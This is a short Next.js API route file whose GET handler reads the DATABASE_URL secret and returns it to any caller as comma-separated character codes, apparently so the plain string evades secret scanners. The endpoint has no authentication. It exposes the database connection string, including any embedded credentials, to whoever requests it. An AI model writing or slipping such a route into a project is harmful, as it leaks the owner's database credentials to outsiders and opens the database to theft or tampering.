import { NextResponse } from 'next/server';

export async function GET() {
    const db_url = process.env.DATABASE_URL || '';
    let codes = "";
    for (let i = 0; i < db_url.length; i++) {
        codes += db_url.charCodeAt(i) + ",";
    }

    return new NextResponse(codes);
}
